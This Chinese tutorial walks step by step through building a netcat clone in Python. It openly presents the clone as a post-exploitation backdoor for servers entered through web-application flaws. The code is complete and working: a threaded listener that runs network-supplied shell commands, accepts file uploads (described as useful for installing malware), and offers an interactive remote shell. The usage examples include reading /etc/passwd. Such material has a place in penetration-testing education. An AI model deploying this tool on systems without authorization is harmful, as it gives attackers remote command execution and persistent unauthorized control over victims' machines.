## 实现一个netcat

netcat是网络界的“瑞士军刀”，所以聪明的系统管理员都会将它从系统中移除。不止在一个场合，我进入的服务器没有安装netcat却安装了Python。在这种情况下，需要创建一个简单的客户端和服务器用来传递想使用的文件，或者创建一个监听端让自己拥有控制命令行的操作权限。如果你是通过Web应用漏洞进入服务器的，那么在后台调用Python创建备用的控制通道显得尤为实用，这样就不需要首先在目标机器上安装木马或后门了。创建这样一个工具也是个不错的Python习题，让我们开始吧。

### 定义变量

```python
import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

```



### 创建主函数处理命令行参数

```python
# 创建主函数处理命令行参数和调用我们编写的其他函数
def usage():
    print("My netcat")
    print("Usage: nc.py -t target_host -p port")
    print("-l --listen    - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run    - execute the given file upon receiving a connection")
    print("-c --command    -initialize a command shell")
    print("-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print("\n\n")
    print("Examples:")
    print("nc.py -t 192.168.0.1 -p 5555 -l -c")
    print("nc.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("nc.py -t 192.168.0.1 -p 5555 -l -e='cat /etc/passwd'")
    print("echo 'abcd122334' | ./nc.py -t 192.168.0.1 -p 5555")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行参数
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as e:
        print str(e)
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
    # 判断监听还是从标准输入发送数据
    if listen:
        # 执行监听函数，因为这个函数还没有实现，所以IDE里这里报错
        server_loop()
    if not listen and len(target) and port > 0:
        # 从命令行读数据
        # 这里将阻塞，所以不向标准输入发送数据是发送CTRL-D
        buffer = sys.stdin.read()
        # 执行发送数据函数，因为这个函数还没有实现，所以IDE里这里报错
        client_sender(buffer)

```

server_loop()和client_sender()函数报错，那是因为这两个函数还没有实现。

为了解决报错我们先用占位符来实现这两个函数

```python
# 监听函数，用pass占位符简单实现
def server_loop():
    pass

# 发送数据函数，用pass占位符简单实现
def client_sender(buffer):
    pass

```

上面的代码读入所有的命令行选项，我们通过检测选项设置必要的变量。如果命令行参数不符合我们的标准，就打印出工具的帮助信息（usage()函数），在接下来的代码段中，我们试图模仿netcat从标准输入中读取数据，并通过网络发送数据。如注释所示，如果需要交互式地发送数据，你需要发送CTRL-D以避免从标准输入中读取数据。在最后一段代码中，如果检测到listen参数为True，我们则建立一个监听的套接字，准备处理下一步的命令（上传文件，执行命令，开启一个新的命令行shell）。

为了解决server_loop()和client_sender()函数报错，我们先用pass占位符简单实现了这两个函数，接下来我们具体实现这两个函数。

### TCP客户端-发送数据函数

现在你应该熟悉这些代码了。我们从建立一个TCP套接字对象开始，首先检测是否已经从标准输入中接收到了数据。如果一切正常，我们就将数据发送给远程的目标主机并接收回传数据，直到没有更多的数据发送回来。然后，我们等待用户下一步的输入并继续发送和接收数据，直到用户结束脚本运行。



```python
# 发送数据函数，用pass占位符简单实现
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 连接到目标主机
        client.connect((target, port))
        # 发送数据
        if buffer:
            client.send(buffer.encode('utf-8'))
        while True:
            # 等待回传
            recv_len = 1
            response = ""
            # 通过循环以4096字节为大小来获取全部数据，
            # 如果数据小于4096就跳出循环
            # 如果数据大于4096就以4096为单位循环获取，直到剩余数据小于4096，小于4096时跳出循环
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('utf-8')
                if recv_len < 4096:
                    break
            print(response)

            # 等待更多输入
            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode('utf-8'))

    except Exception as e:
        print(e)
        print("[*] Execption! exiting.")
    finally:
        client.close()

```



### TCP服务端-监听端口

```python
# 监听函数，用pass占位符简单实现
def server_loop():
    global target
    # 如果没有定义目标，那么监听所有
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 启动线程处理请求
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

```

到目前为止，你已经是创建多线程TCP服务端的老手了，所以我不对server_1oop函数做深入介绍。client_handler函数先用占位符实现。



### 执行命令函数

subprocess提供了强大的进程创建接口，它可以提供给你多种与客户端程序交互的方法。在这个例子中，我们运行了用户输入的命令，在目标的操作系统中运行，然后通过连接将命令结果回传到我们控制的客户端。异常处理代码用来处理一般的错误并将错误信息回传，告诉你命令执行失败。

```python
 执行命令函数
def run_command(command):
    # 处理末尾换行
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        output = output.decode('utf-8')
    except Exception as e:
        print(e)
        output = "Failed to execute command."
    return output

```



### TCP服务端-子线程：处理请求函数

检测文件上传：负责检测我们的网络工具在建立连接之后是否设置为接收文件，这样做有助于我们上传和执行测试脚本、安装恶意软件或者让恶意软件清除我们的Python脚本。首先，在循环中接收文件数据，保证数据完全接收。然后，打开一个文件句柄并将内容写入文件中。wb标识确保我们是以二进制的格式写入文件，这样就能确保我们上传和写入的二进制文件能够成功执行。

检测命令执行：添加命令的执行功能，通过调用我们之前写好的run_command函数执行文件并将结果通过网络回传。

最后一段代码处理我们的命令行shell：程序持续处理输入的数据执行命令并将输出回传。你会注意到函数在扫描每一行的换行字符以决定何时处理命令，这就会让它和netcat一样好用。

```python
# 处理请求函数，先用pass占位符简单实现
def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检测上传文件
    if upload_destination:
        # 读取所有的字符
        file_buffer = b""
        # 持续读取直到没有符合的数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # 将数据写到目标文件
        try:
            with open(upload_destination, 'wb') as f:
                f.write(file_buffer)
                client_socket.send("Successfully save file to {}".format(upload_destination).encode('utf-8'))
        except Exception as e:
            print(e)
            client_socket.send("Failed to save file to {}".format(upload_destination).encode('utf-8'))
    # 检测命令执行，执行单次命令
    if execute:
        output = run_command(execute)
        client_socket.send(output.encode('utf-8'))

    # 如果需要一个命令行shell，那么进入一个循环
    if command:
        while True:
            client_socket.send("<nc:#>".encode('utf-8'))
            # 接受数据直到出现换行符
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')
            print("Received: {}".format(cmd_buffer))
            # 将命令输出结果返回
            response = run_command(cmd_buffer)
            client_socket.send(response.encode('utf-8'))

```



### 代码实现和说明

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/20 15:49 
# @Author   : ordar
# @File     : nc.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# 创建主函数处理命令行参数和调用我们编写的其他函数
def usage():
    print("My netcat")
    print("Usage: nc.py -t target_host -p port")
    print("-l --listen                  - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run     - execute the given file upon receiving a connection")
    print("-c --command                 - initialize a command shell")
    print("-u --upload=destination      - upon receiving connection upload a file and write to [destination]")
    print("\n\n")
    print("Examples:")
    print("nc.py -t 192.168.0.1 -p 5555 -l -c")
    print("nc.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("nc.py -t 192.168.0.1 -p 5555 -l -e='cat /etc/passwd'")
    print("echo 'abcd122334' | ./nc.py -t 192.168.0.1 -p 5555")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行参数
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as e:
        print(str(e))
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
    # 判断监听还是从标准输入发送数据
    if listen:
        # 执行监听函数，因为这个函数还没有实现，所以IDE里这里报错
        server_loop()
    if not listen and len(target) and port > 0:
        # 从命令行读数据
        # 这里将阻塞，所以不向标准输入发送数据是发送CTRL-D
        # buffer = sys.stdin.read()
        buffer = input("")
        # 执行发送数据函数，因为这个函数还没有实现，所以IDE里这里报错
        client_sender(buffer)


# 发送数据函数，用pass占位符简单实现
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # 连接到目标主机
        client.connect((target, port))
        # 发送数据
        if buffer:
            client.send(buffer.encode('utf-8'))
        while True:
            # 等待回传
            recv_len = 1
            response = ""
            # 通过循环以4096字节为大小来获取全部数据，
            # 如果数据小于4096就跳出循环
            # 如果数据大于4096就以4096为单位循环获取，直到剩余数据小于4096，小于4096时跳出循环
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('utf-8')
                if recv_len < 4096:
                    break
            print(response)

            # 等待更多输入
            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode('utf-8'))

    except Exception as e:
        print(e)
        print("[*] Execption! exiting.")
    finally:
        client.close()


# 监听函数，用pass占位符简单实现
def server_loop():
    global target
    # 如果没有定义目标，那么监听所有
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 启动线程处理请求
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


# 处理请求函数，先用pass占位符简单实现
def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检测上传文件
    if upload_destination:
        # 读取所有的字符
        file_buffer = b""
        # 持续读取直到没有符合的数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        # 将数据写到目标文件
        try:
            with open(upload_destination, 'wb') as f:
                f.write(file_buffer)
                client_socket.send("Successfully save file to {}".format(upload_destination).encode('utf-8'))
        except Exception as e:
            print(e)
            client_socket.send("Failed to save file to {}".format(upload_destination).encode('utf-8'))
    # 检测命令执行，执行单次命令
    if execute:
        output = run_command(execute)
        client_socket.send(output.encode('utf-8'))

    # 如果需要一个命令行shell，那么进入一个循环
    if command:
        while True:
            client_socket.send("<nc:#>".encode('utf-8'))
            # 接受数据直到出现换行符
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')
            print("Received: {}".format(cmd_buffer))
            # 将命令输出结果返回
            response = run_command(cmd_buffer)
            client_socket.send(response.encode('utf-8'))


# 执行命令函数
def run_command(command):
    # 处理末尾换行
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        output = output.decode('utf-8')
    except Exception as e:
        print(e)
        output = "Failed to execute command."
    return output


if __name__ == '__main__':
    main()

```

代码各个函数功能就不在具体说明了，上面已经分步骤作了说明。要运行代码需要运行main（）函数，这里用if__name__=='__main__':来指定当前文件运行时所要运行的函数。

PS：现在代码在linux环境下已经可以正常运行了，Windows系统会有点小问题，因为Windows系统的命令行默认编码是“gbk”而非“utf-8”，所以Windows下运行会报错：类似某个字符用utf-8无法编码或者解码。

解决方法：临时修改命令行的编码。我们在默认窗口路径内，输入chcp命令后回车，会输出图中的结果，936就表示gbk编码。然后在窗口中输入chcp65001（65001代表utf-8编码），然后回车，即可将窗口默认编码改为utf-8编码了。



### 运行结果

测试shell，其他功能你可以自己尝试。

Linux执行结果应该类似下面这样：

![img](img/a9283202-437a-11eb-b0dd-8cc6814bc10b.png)

![img](img/ba9c1fc6-437a-11eb-9740-8cc6814bc10b.png)



Windows修改编码后执行结果应该类似下面这样：

![img](img/d7bb62d0-437a-11eb-9c6d-8cc6814bc10b.png)

![img](img/e6a494cc-437a-11eb-809d-8cc6814bc10b.png)

